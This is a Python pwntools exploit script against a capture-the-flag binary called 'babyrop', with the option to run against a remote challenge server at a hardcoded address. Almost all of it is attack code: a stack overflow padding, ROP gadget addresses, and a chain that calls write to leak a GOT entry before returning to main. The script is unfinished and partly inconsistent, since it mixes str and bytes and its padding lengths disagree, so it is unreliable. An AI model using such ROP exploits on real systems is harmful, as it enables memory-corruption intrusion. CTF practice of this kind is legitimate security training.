from pwn import *
context.log_level='DEBUG'

p = process("./babyrop")
elf = ELF("./babyrop", checksec=False)
libc = elf.libc
rop = ROP(elf)

def start():
	if not args.REMOTE:
		return process("./babyrop")
	else:
		return remote("34.141.31.183", 30275)

p = start()

def main():

	# 0x0000000000401313 : pop rdi ; ret
	# 0x0000000000401152 : pop rdx ; ret
	# 0x0000000000401311 : pop rsi ; pop r15 ; ret
	# 0x000000000040130d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
	# 0x000000000040101a : ret

	# 0x0000000000401106  read
	# 0x000000000040112a  write
	# 0x000000000040114e  __lib_csu_dtor
	# 0x0000000000401157  main

	# p.sendline(b"A"*520 + pwn.p64(pop_rdi) + pwn.p64(0x1) + pwn.p64(pop_rsi) + pwn.p64(elf.got['read']) + pwn.p64(0x0) + pwn.p64(elf.plt['write']) + pwn.p64(elf.symbols['main']))
	# leak = pwn.u64(p.recv(8))

	# 0x40400a
	# 0x0000000000401014

	global rop

	payload = ""
	payload += "A"*216
	payload += p64(0x0000000000401313)
	payload += p64(0x1)
	payload += p64(0x0000000000401311)
	payload += p64(0x0000000000401106)
	payload += p64(0x0)
	payload += p64(0x000000000040112a)
	#payload += p64(0x0000000000401020)
	payload += p64(0x0000000000401157)
	#payload += p64(0x0000000000401152)
	#payload += p64(0x400)

	pause()
	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
